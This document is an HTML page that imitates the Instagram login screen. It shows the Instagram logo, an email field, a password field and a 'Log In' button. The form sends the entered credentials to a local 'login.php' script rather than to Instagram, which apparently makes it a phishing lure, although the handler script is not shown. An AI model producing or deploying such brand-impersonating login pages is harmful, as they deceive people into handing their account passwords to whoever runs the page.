<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 10px;
    }
    .container img {
      width: 175px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #0077cc;
    }
    .or {
      margin: 15px 0;
      color: #999;
      font-size: 14px;
    }
    .forgot {
      color: #385185;
      font-size: 12px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="Instagram_logo_2016.svg.png" alt="Instagram" style=" width:  100px ; height:  80px;">
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Email" required> <!-- Added Email Field -->
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        
    
    <div class="or">OR</div>
    <a class="forgot" href="#">Forgot password?</a>
  </div>

</body>
</html>
